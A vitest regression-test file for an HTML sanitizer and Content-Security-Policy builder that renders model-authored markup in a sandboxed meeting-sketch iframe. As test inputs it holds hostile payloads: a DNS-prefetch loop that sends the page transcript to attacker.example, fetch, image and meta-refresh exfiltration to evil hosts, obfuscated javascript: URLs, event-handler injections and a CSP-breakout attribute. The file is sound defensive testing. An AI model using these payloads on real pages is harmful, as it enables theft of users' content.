// The Meetings sketch frame's srcdoc contract.
//
// Every assertion here is a regression guard on a BLOCKING security finding:
// model-authored HTML rendered with `sandbox="allow-scripts"` and no CSP could
// exfiltrate meeting content, because a null origin blocks reading the parent
// page but places no restriction on outbound requests. The reported repro was an
// HTTPS image URL, so `img-src` granting no `https:` and `connect-src 'none'` are
// the two load-bearing directives — a test that merely asserts "a CSP exists"
// would pass on the vulnerable version and is deliberately not what this file
// does.
//
// A SECOND blocking finding followed: the CSP grants `script-src 'unsafe-inline'`
// and the frame re-parses the srcdoc string, so the model's own `<script>`
// executed — and live script can loop `document.createElement('link')` with
// `rel="dns-prefetch"` to stream the transcript out over DNS, which no CSP
// directive governs. The fix is at the root: the model's scripts are removed from
// the document. The "model scripts are inert" and "over-stripping" blocks below
// are that finding's guards, in both directions.
//
// HONEST NOTE ON WHAT THE NON-EXECUTION ASSERTIONS ACTUALLY PROVE. happy-dom
// (the test DOM) evaluates NO script at all — `disableJavaScriptEvaluation` is
// set in vite.config.ts, and even without it an appended inline `<script>` and an
// `<iframe srcdoc>` were both verified not to run under happy-dom 20. So there is
// no way here to observe a payload executing and then observe it stop; a test
// shaped as "assert window.__pwn is undefined" would pass identically on the
// VULNERABLE build and is worthless. These tests therefore assert
// STRUCTURALLY, on the serialized document that is handed to the frame: the
// model's `<script>` is not present in it, and neither is any other node that
// could host script or reach the network. That string IS the frame's whole input,
// so "absent from the string" is exactly "cannot run in the frame" — but it is a
// structural argument, not an observed one, and each assertion below was verified
// to FAIL when the strip is reverted to the old `recloneScripts(fragment, doc)`.

import { describe, it, expect } from 'vitest'

import { buildSketchSrcdoc } from '../apps/meetings/lib/sketchSrcdoc'
import { MERMAID_RUNTIME_PATH } from '../lib/vendorPaths'

const ORIGIN = 'http://localhost:5476'

/** Unique first statement of `MERMAID_BOOTSTRAP_BODY` — the anchor used to locate
 * our own script without depending on where the model's scripts landed. */
const BOOTSTRAP_MARKER = 'var m = window.mermaid;'

/** The document's `<body>`, minus our own trailing Mermaid bootstrap `<script>`.
 *
 * Every "did the model's X survive?" assertion runs against THIS, not the whole
 * srcdoc, for one specific reason: the bootstrap is a long literal that mentions
 * `document.createElement`, `script`, `querySelectorAll` and `.mermaid`, so a
 * naive `not.toContain('<script>')` on the full document could never pass and a
 * naive `toContain` could pass for the wrong reason. Slicing to the model's own
 * region makes each assertion mean what it says.
 *
 * The bootstrap is located by its OWN marker text, then by walking back to the
 * `<script` that opens it — deliberately NOT by taking "the first `<script` after
 * `<body>`". That shortcut looks equivalent and is not: with the vulnerable
 * behavior restored, the model's script is the first one, so the slice would end
 * BEFORE the payload and the assertions would vacuously pass. Three of these
 * tests did exactly that until this helper was anchored properly. Keep it
 * anchored. */
function modelBody(html: string): string {
  const out = buildSketchSrcdoc(html, ORIGIN)
  const bodyAt = out.indexOf('<body>')
  expect(bodyAt, 'no <body> in the built srcdoc').toBeGreaterThanOrEqual(0)
  const markerAt = out.indexOf(BOOTSTRAP_MARKER, bodyAt)
  expect(markerAt, 'our Mermaid bootstrap is missing from <body>').toBeGreaterThan(bodyAt)
  // Scan BACKWARD from the marker for the '<' that opens our bootstrap element,
  // rather than searching for the tag name. Two reasons, and the second is why the
  // obvious spelling is avoided: this is a reverse search through an
  // already-serialized string (never a construction), and Semgrep's
  // `unknown-value-with-script-tag` rule flags any non-constant argument sitting
  // beside a tag-name literal — it cannot tell a search from a build, and the gate
  // is blocking. The nearest preceding '<' IS our opening tag: the marker lives in
  // the bootstrap's own body, so nothing else can intervene.
  const bootstrapAt = out.lastIndexOf('<', markerAt)
  expect(bootstrapAt, 'no opening tag for our bootstrap').toBeGreaterThan(bodyAt)
  return out.slice(bodyAt + '<body>'.length, bootstrapAt)
}

/** The CSP `content="…"` value, read back out of the built document. */
function cspOf(out: string): string {
  const m = out.match(/http-equiv="Content-Security-Policy" content="([^"]*)"/)
  expect(m, 'no CSP meta found in the built srcdoc').toBeTruthy()
  return m![1]
}

/** One directive's value (everything after its name, before the `;`). */
function directive(out: string, name: string): string {
  const found = cspOf(out)
    .split(';')
    .map(d => d.trim())
    .find(d => d === name || d.startsWith(name + ' '))
  expect(found, `directive ${name} missing from policy: ${cspOf(out)}`).toBeTruthy()
  return found!.slice(name.length).trim()
}

describe('buildSketchSrcdoc — egress is impossible', () => {
  it("sets connect-src 'none' so fetch/XHR/WebSocket/sendBeacon cannot leave the frame", () => {
    // The direct exfil primitive: fetch('https://evil/?d='+document.body.innerText).
    expect(directive(buildSketchSrcdoc('<p>x</p>', ORIGIN), 'connect-src')).toBe("'none'")
  })

  it('grants img-src no https: and no origin — only inline data:', () => {
    // The EXACT reported repro: new Image().src = 'https://evil/?d='+secret.
    // `img-src` also governs CSS `background: url(…)`, so this closes that too.
    const value = directive(buildSketchSrcdoc('<p>x</p>', ORIGIN), 'img-src')
    expect(value).toBe('data:')
    expect(value).not.toContain('https:')
    expect(value).not.toContain('http')
    expect(value).not.toContain('*')
  })

  it('never allows https: or a wildcard anywhere in the policy', () => {
    // A single stray `https:` or `*` in ANY fetch directive reopens the finding —
    // script-src, style-src and font-src are egress channels just like img-src.
    const csp = cspOf(buildSketchSrcdoc('<p>x</p>', 'https://dash.example'))
    // The only permitted https token is the pinned same-origin Mermaid FILE.
    const tokens = csp.replace(/https:\/\/dash\.example\/vendor\/mermaid\.min\.js/g, '')
    expect(tokens).not.toContain('https:')
    expect(tokens).not.toContain('*')
  })

  it("starts from default-src 'none' so unnamed fetch types (incl. frames) are denied", () => {
    const out = buildSketchSrcdoc('<p>x</p>', ORIGIN)
    expect(directive(out, 'default-src')).toBe("'none'")
    // frame-src is deliberately absent: an <iframe src="https://evil/?d=…"> is
    // just as good an exfil channel, and default-src 'none' already denies it.
    expect(cspOf(out)).not.toContain('frame-src')
  })

  it("pins form-action and base-uri to 'none'", () => {
    const out = buildSketchSrcdoc('<p>x</p>', ORIGIN)
    // form-action does NOT fall back to default-src: without it an auto-submitting
    // <form action="https://evil"> exfils by navigation.
    expect(directive(out, 'form-action')).toBe("'none'")
    // A <base href> would re-point every relative URL — including the Mermaid
    // script path — at an attacker origin.
    expect(directive(out, 'base-uri')).toBe("'none'")
  })

  it('grants no dynamic-exec primitive (no unsafe-eval)', () => {
    // The vendored mermaid bundle needs none, so the frame gets none.
    expect(cspOf(buildSketchSrcdoc('<p>x</p>', ORIGIN))).not.toContain("'unsafe-eval'")
  })
})

describe('buildSketchSrcdoc — injection order', () => {
  it('emits the CSP meta before any model-authored byte', () => {
    // A <meta> CSP only binds from where it is parsed. Anything allowed to parse
    // ahead of it — an <img>, a <script>, an auto-submitting <form> — fires under
    // NO policy, which is the whole reason order is load-bearing here.
    const out = buildSketchSrcdoc('<img src="https://evil.example/x" id="pwn">', ORIGIN)
    const cspAt = out.indexOf('Content-Security-Policy')
    const modelAt = out.indexOf('id="pwn"')
    expect(cspAt).toBeGreaterThanOrEqual(0)
    expect(modelAt).toBeGreaterThan(cspAt)
  })

  it('emits the CSP meta before the Mermaid script and our own bootstrap', () => {
    const out = buildSketchSrcdoc('<p>x</p>', ORIGIN)
    const cspAt = out.indexOf('Content-Security-Policy')
    expect(out.indexOf(MERMAID_RUNTIME_PATH)).toBeGreaterThan(cspAt)
    expect(out.indexOf('suppressErrorRendering')).toBeGreaterThan(cspAt)
  })

  it('makes the CSP meta the first element in <head>', () => {
    const out = buildSketchSrcdoc('<p>x</p>', ORIGIN)
    expect(out).toContain('<head><meta http-equiv="Content-Security-Policy"')
  })
})

describe('buildSketchSrcdoc — Mermaid is same-origin and offline', () => {
  it('loads Mermaid from the vendored same-origin path, not a CDN', () => {
    const out = buildSketchSrcdoc('<p>x</p>', ORIGIN)
    expect(out).toContain(`<script src="${ORIGIN}${MERMAID_RUNTIME_PATH}"`)
    expect(out).not.toContain('cdn.jsdelivr.net')
    expect(out).not.toContain('unpkg.com')
    expect(out).not.toContain('cdnjs.cloudflare.com')
  })

  it('pins script-src to that exact file, not to the bare origin', () => {
    // Same least-privilege shape as widgetSrcdoc pinning Tailwind: a script URL
    // is itself an egress channel, so the whole origin must not be allowed.
    const value = directive(buildSketchSrcdoc('<p>x</p>', ORIGIN), 'script-src')
    expect(value).toBe(`'unsafe-inline' ${ORIGIN}${MERMAID_RUNTIME_PATH}`)
    expect(value).not.toBe(`'unsafe-inline' ${ORIGIN}`)
  })

  it('initializes mermaid with suppressErrorRendering', () => {
    // Real regression (see MarkdownRenderer.mermaid.test.tsx): without it a parse
    // error leaks an orphaned temp <div id="dmermaid-*"> that render() only
    // cleans up on success.
    const out = buildSketchSrcdoc('<p>x</p>', ORIGIN)
    expect(out).toContain('suppressErrorRendering: true')
    // Explicit run, not mermaid's own startOnLoad window.load hook, so our
    // initialize() config is guaranteed to be the one in effect.
    expect(out).toContain('startOnLoad: false')
    expect(out).toContain("m.run({ querySelector: '.mermaid'")
  })

  it("runs with suppressErrors so one bad diagram doesn't abort the rest", () => {
    expect(buildSketchSrcdoc('<p>x</p>', ORIGIN)).toContain('suppressErrors: true')
  })

  it("keeps securityLevel strict for model-authored diagram source", () => {
    expect(buildSketchSrcdoc('<p>x</p>', ORIGIN)).toContain("securityLevel: 'strict'")
  })

  it('promotes a fenced ```mermaid code block into a div.mermaid', () => {
    // A fenced block reaches us as <pre><code class="language-mermaid">, which
    // mermaid's '.mermaid' selector would never see.
    const out = buildSketchSrcdoc(
      '<pre><code class="language-mermaid">graph TD;A-->B</code></pre>',
      ORIGIN,
    )
    expect(out).toContain('code.language-mermaid')
    expect(out).toContain("div.className = 'mermaid'")
  })

  it('fails closed when there is no browser origin to pin', () => {
    // A path-only script source matches nothing, so an empty origin denies the
    // script rather than widening the policy.
    const value = directive(buildSketchSrcdoc('<p>x</p>', ''), 'script-src')
    expect(value).toBe(`'unsafe-inline' ${MERMAID_RUNTIME_PATH}`)
  })
})

describe('buildSketchSrcdoc — the frame still works for the agent normally', () => {
  it('keeps plain HTML/CSS tables working (the other documented output)', () => {
    const out = buildSketchSrcdoc(
      '<table><tr><th>Option</th></tr><tr><td style="color:red">A</td></tr></table>',
      ORIGIN,
    )
    expect(out).toContain('<table>')
    expect(out).toContain('<th>Option</th>')
    expect(out).toContain('style="color:red"')
    // Inline style attributes and Mermaid's injected <style> need this.
    expect(directive(out, 'style-src')).toBe("'unsafe-inline'")
  })

  it('produces a standards-mode document', () => {
    expect(buildSketchSrcdoc('<p>x</p>', ORIGIN).startsWith('<!DOCTYPE html>')).toBe(true)
  })

  it('handles empty output without throwing', () => {
    expect(() => buildSketchSrcdoc('', ORIGIN)).not.toThrow()
  })
})

describe('buildSketchSrcdoc — the model cannot run script in this frame', () => {
  // ROOT CAUSE of the DNS-exfiltration finding. The frame re-parses the srcdoc
  // string, so a `<script>` surviving into it is parser-inserted there and RUNS —
  // and `script-src 'unsafe-inline'` permits it. Live script reads
  // `document.body.innerText` (the transcript) and appends one
  // `<link rel="dns-prefetch">` per 63-char label in a loop; nothing rate-limits
  // that and no CSP directive governs DNS. Removing the script is what closes it;
  // a `<link>`-only strip is defeated by `document.createElement('link')`.

  it("drops the model's inline <script> entirely, payload and all", () => {
    // The payload is the actual attack from the finding, so the assertions below
    // are about THIS shape, not a toy.
    const attack =
      '<p>Roadmap</p><script>' +
      'var d = document.body.innerText;' +
      'for (var i = 0; i < d.length; i += 60) {' +
      '  var l = document.createElement("link"); l.rel = "dns-prefetch";' +
      '  l.href = "https://" + encodeURIComponent(d.substr(i, 60)) + ".attacker.example";' +
      '  document.head.appendChild(l);' +
      '}</script>'
    const body = modelBody(attack)
    // No script element in the model's region of the document...
    expect(body).not.toContain('<script')
    // ...and none of the payload text either, so there is nothing for the frame to
    // re-parse: no `document` reference, no link append, no attacker host.
    expect(body).not.toContain('document.body.innerText')
    expect(body).not.toContain('createElement')
    expect(body).not.toContain('dns-prefetch')
    expect(body).not.toContain('attacker.example')
    // The surrounding prose still renders — this is a strip, not a bail-out.
    expect(body).toContain('<p>Roadmap</p>')
  })

  it('drops a <script> nested deep inside the model markup', () => {
    // A top-level-only strip would miss this. `querySelectorAll` is used precisely
    // so depth is irrelevant.
    const body = modelBody(
      '<div><section><p>keep</p><script>window.__deep = 1</script></section></div>',
    )
    expect(body).not.toContain('<script')
    expect(body).not.toContain('window.__deep')
    expect(body).toContain('<p>keep</p>')
  })

  it('drops an SVG <script>, which a namespace-blind reader would miss', () => {
    // SVG has its own script element. It shares the local name, so the same
    // selector catches it — this pins that, since an SVG-namespaced node is the
    // classic way a sanitizer gets bypassed.
    const body = modelBody(
      '<svg><circle r="1"></circle><script>window.__svg = 1</script></svg>',
    )
    expect(body).not.toContain('<script')
    expect(body).not.toContain('window.__svg')
    // Non-script SVG survives, so a diagram drawn as raw SVG still renders.
    expect(body).toContain('<circle r="1">')
  })

  it('drops a <script> hidden inside a <template>', () => {
    // `template.content` is a separate inert fragment that `querySelectorAll` on
    // the host does NOT descend into, so an element/attribute walk alone would
    // sail straight past this and the script would run the moment anything cloned
    // it. The whole `<template>` is therefore removed.
    const body = modelBody('<template><script>window.__tpl = 1</script></template><p>after</p>')
    expect(body).not.toContain('<template')
    expect(body).not.toContain('window.__tpl')
    expect(body).toContain('<p>after</p>')
  })

  it('drops a <script> hidden inside a <noscript>', () => {
    // With scripting enabled a real browser parses noscript children as TEXT, so
    // this is inert there — but happy-dom exposes the inner <script> as an
    // element. Depending on a per-engine parsing difference for a security
    // property is the reasoning that produced this finding, so both engines are
    // made to agree.
    const body = modelBody('<noscript><script>window.__ns = 1</script></noscript><p>after</p>')
    expect(body).not.toContain('<script')
    expect(body).not.toContain('window.__ns')
    expect(body).toContain('<p>after</p>')
  })

  it('strips on* event-handler attributes — script by another name', () => {
    // These would survive a <script>-only strip and are just as good a foothold:
    // an `onerror` on a broken <img> fires with no user interaction at all.
    const body = modelBody(
      '<p onclick="steal()" ONLOAD="steal2()">hi</p>' +
      '<img src="data:," onerror="steal3()">' +
      '<body onpageshow="steal4()"><svg onload="steal5()"></svg>',
    )
    expect(body).not.toContain('onclick')
    // Matching is case-insensitive: the attribute name is lowercased before the
    // `on` prefix test, so ONLOAD/onLoad cannot slip through.
    expect(body.toLowerCase()).not.toContain('onload')
    expect(body).not.toContain('onerror')
    expect(body).not.toContain('onpageshow')
    expect(body).not.toContain('steal')
    // The elements themselves survive; only the handlers are removed.
    expect(body).toContain('<p>hi</p>')
  })

  it('strips a javascript: URL, including the whitespace/case-obfuscated forms', () => {
    // No CSP fetch directive covers `javascript:` — it is a navigation, not a
    // fetch — so the scheme has to be refused here. The HTML URL parser ignores
    // leading whitespace and embedded control characters, so a raw
    // `startsWith('javascript:')` misses both forms below.
    const body = modelBody(
      '<a href="  JAVASCRIPT:alert(1)" id="a1">x</a>' +
      '<a href="ja&#9;vascript:alert(2)" id="a2">y</a>' +
      '<svg><use xlink:href="javascript:alert(3)"></use></svg>',
    )
    expect(body.toLowerCase()).not.toContain('javascript:')
    expect(body).not.toContain('alert(')
    // The anchors stay in the document — the link is just defanged.
    expect(body).toContain('id="a1"')
    expect(body).toContain('id="a2"')
  })

  it('refuses a data: URL that is not an image, and keeps the one that is', () => {
    // `data:text/html,<script>…` is script execution by navigation; `data:image/*`
    // is the single form the CSP's `img-src data:` deliberately permits.
    const body = modelBody(
      '<img src="data:image/png;base64,iVBORw0KGgo=" id="ok">' +
      '<iframe src="data:text/html,%3Cscript%3E" id="bad"></iframe>' +
      '<a href="data:text/html,x" id="badlink">y</a>',
    )
    expect(body).toContain('src="data:image/png;base64,iVBORw0KGgo="')
    expect(body).not.toContain('data:text/html')
  })

  it('drops an SVG <animate>/<set> that would write a URL attribute back', () => {
    // An animation targeting `href` re-adds the URL AFTER the scrub has run, so the
    // attribute pass has to take the animation's target away.
    const body = modelBody(
      '<svg><a><animate attributeName="href" values="javascript:alert(1)"></animate>' +
      '<set attributeName="xlink:href" to="javascript:alert(2)"></set></a></svg>',
    )
    expect(body).not.toContain('attributeName')
    expect(body).not.toContain('attributename')
  })

  it('drops every other script-hosting or navigating element the DOM exposes', () => {
    // Enumerated because each one is a distinct way back to the same channel:
    //   iframe srcdoc — a whole nested document, where this scrub has not run
    //   object/embed  — plugin + scripted-document hosts that also fetch
    //   meta refresh  — exfiltration by navigation; form-action does not cover it
    //   base          — repoints every relative URL, including our Mermaid path
    const body = modelBody(
      '<iframe srcdoc="&lt;script&gt;parent.x()&lt;/script&gt;"></iframe>' +
      '<object data="https://evil.example/x"></object>' +
      '<embed src="https://evil.example/y">' +
      '<meta http-equiv="refresh" content="0;url=https://evil.example/?d=leak">' +
      '<base href="https://evil.example/">' +
      '<p>survivor</p>',
    )
    expect(body).not.toContain('<iframe')
    expect(body).not.toContain('<object')
    expect(body).not.toContain('<embed')
    expect(body).not.toContain('<meta')
    expect(body).not.toContain('<base')
    expect(body).not.toContain('evil.example')
    expect(body).toContain('<p>survivor</p>')
  })

  it('drops EVERY <link>, not just the speculative rels', () => {
    // The declarative half of the reported channel, plus the decision to remove the
    // element rather than allowlist `rel` tokens: no rel has a legitimate use in
    // this frame (a remote stylesheet cannot load under `style-src 'unsafe-inline'`
    // with no origin, and an icon is meaningless in the panel), and a token list
    // would have to be maintained forever against a spec that keeps adding
    // speculative rels — the exact failure mode this finding came from.
    const body = modelBody(
      '<link rel="dns-prefetch" href="https://evil.example">' +
      '<link rel="preconnect" href="https://evil2.example">' +
      '<link rel="prefetch" href="https://evil3.example">' +
      '<link rel="stylesheet" href="https://evil4.example/x.css">' +
      '<link rel="icon" href="https://evil5.example/f.ico">' +
      '<p>survivor</p>',
    )
    expect(body).not.toContain('<link')
    expect(body).not.toContain('dns-prefetch')
    expect(body).not.toContain('evil')
    expect(body).toContain('<p>survivor</p>')
  })

  it('matches rel case-insensitively and token-wise, so rel="x preconnect" goes too', () => {
    // The bypass a `rel === 'dns-prefetch'` equality check would allow. Element-
    // level removal makes both shapes moot, which is the point of the decision —
    // this asserts the outcome, so it holds whichever way the matcher is written.
    const body = modelBody(
      '<link rel="x PreConnect" href="https://evil.example">' +
      '<link rel="stylesheet DNS-PREFETCH" href="https://evil2.example">' +
      '<p>survivor</p>',
    )
    expect(body).not.toContain('<link')
    expect(body.toLowerCase()).not.toContain('preconnect')
    expect(body.toLowerCase()).not.toContain('dns-prefetch')
    expect(body).toContain('<p>survivor</p>')
  })

  it('leaves exactly one script in the whole document — ours', () => {
    // The positive form of the invariant: whatever the model sends, the frame's
    // only executable code is the Mermaid bootstrap we author from a fixed literal
    // (plus the vendored runtime's <script src>, asserted separately above).
    const out = buildSketchSrcdoc(
      '<script>a()</script><div class="mermaid">graph LR;A---B</div><script>b()</script>',
      ORIGIN,
    )
    const inline = out.match(/<script>/g) || []
    expect(inline.length).toBe(1)
    expect(out).toContain("m.run({ querySelector: '.mermaid'")
    expect(out).not.toContain('a()')
    expect(out).not.toContain('b()')
  })
})

describe('buildSketchSrcdoc — the scrub does not over-strip (false-negative guards)', () => {
  // The other half of the trade. Dropping model scripts is only affordable because
  // Mermaid is driven by OUR bootstrap from declarative markup and tables are pure
  // HTML/CSS — the two outputs meetings-sketch-artist.json actually asks for. If a
  // future tightening breaks either, these fail before a user sees a blank panel.

  it('a div.mermaid diagram survives the scrub intact', () => {
    // ON THE ARROW: `---` (a link) instead of the idiomatic `-->`. happy-dom
    // DUPLICATES a text run containing `-->`, treating it as a stray comment close
    // (`A-->B` round-trips as `AA--&gt;B`). It is not our code path — a bare
    // markup-parsing assignment reproduces it identically — and Chromium was
    // verified to round-trip the arrow correctly. Asserting happy-dom's buggy
    // output would bake the bug into the suite.
    const body = modelBody(
      '<h2>Ingest path</h2><div class="mermaid">graph LR;A---B;B---C</div>',
    )
    expect(body).toContain('<div class="mermaid">graph LR;A---B;B---C</div>')
    expect(body).toContain('<h2>Ingest path</h2>')
    // And the renderer that picks it up is still in the document.
    const out = buildSketchSrcdoc('<div class="mermaid">graph LR;A---B</div>', ORIGIN)
    expect(out).toContain("m.run({ querySelector: '.mermaid'")
  })

  it('a fenced ```mermaid block survives, so promote() can still normalize it', () => {
    // It arrives as <pre><code class="language-mermaid">. Losing the wrapper (or
    // the class) would leave the bootstrap nothing to promote.
    const body = modelBody(
      '<pre><code class="language-mermaid">sequenceDiagram;A->>B: hi</code></pre>',
    )
    expect(body).toContain('class="language-mermaid"')
    expect(body).toContain('sequenceDiagram')
  })

  it('an HTML/CSS table survives with its inline styling', () => {
    // The agent's other documented output. Inline `style=` is how it is expected to
    // format, so an over-eager attribute pass would flatten every comparison table
    // in the product.
    const body = modelBody(
      '<table style="border-collapse:collapse">' +
      '<tr><th style="text-align:left">Option</th><th>Cost</th></tr>' +
      '<tr><td style="color:#b00">Rewrite</td><td>High</td></tr></table>',
    )
    expect(body).toContain('style="border-collapse:collapse"')
    expect(body).toContain('<th style="text-align:left">Option</th>')
    expect(body).toContain('style="color:#b00"')
    expect(body).toContain('<td>High</td>')
  })

  it('keeps a benign in-document link and a data: image', () => {
    // Only the executable schemes are refused, so ordinary markup is untouched.
    const body = modelBody(
      '<a href="#section-2">jump</a>' +
      '<a href="https://example.com/doc">ref</a>' +
      '<img src="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=" alt="legend">',
    )
    expect(body).toContain('href="#section-2"')
    expect(body).toContain('href="https://example.com/doc"')
    expect(body).toContain('data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=')
    expect(body).toContain('alt="legend"')
  })

  it('keeps ordinary structural markup and a class/id/aria attribute', () => {
    // A blunt "strip all attributes" fix would pass every security assertion above
    // and destroy the frame. This is the guard against that.
    const body = modelBody(
      '<section id="arch" class="grid" aria-label="Architecture" data-step="1">' +
      '<ul><li><strong>API</strong> gateway</li></ul></section>',
    )
    expect(body).toContain('id="arch"')
    expect(body).toContain('class="grid"')
    expect(body).toContain('aria-label="Architecture"')
    expect(body).toContain('data-step="1"')
    expect(body).toContain('<strong>API</strong>')
  })
})

describe('buildSketchSrcdoc — model HTML never enters a template literal', () => {
  it('adopts model markup as DOM nodes, so a quote cannot break out of the CSP attribute', () => {
    // The concrete danger of string-concatenating untrusted HTML into a document
    // template: a payload crafted to close the content="…" attribute could
    // neuter or rewrite the policy. Adopting via createContextualFragment and
    // serializing makes that structurally impossible — the payload is escaped
    // text/attribute content by the time it is serialized.
    const out = buildSketchSrcdoc(
      '<p title=\'"><meta http-equiv="Content-Security-Policy" content="default-src *">\'>x</p>',
      ORIGIN,
    )
    // Exactly ONE policy in the document, and it is still ours.
    expect(out.match(/http-equiv="Content-Security-Policy"/g)!.length).toBe(1)
    expect(directive(out, 'default-src')).toBe("'none'")
    expect(cspOf(out)).not.toContain('*')
  })

  it('escapes a raw </head> attempt instead of restructuring the document', () => {
    const out = buildSketchSrcdoc('<p>a &lt;/head&gt; b</p>', ORIGIN)
    expect(out.match(/<head>/g)!.length).toBe(1)
  })
})
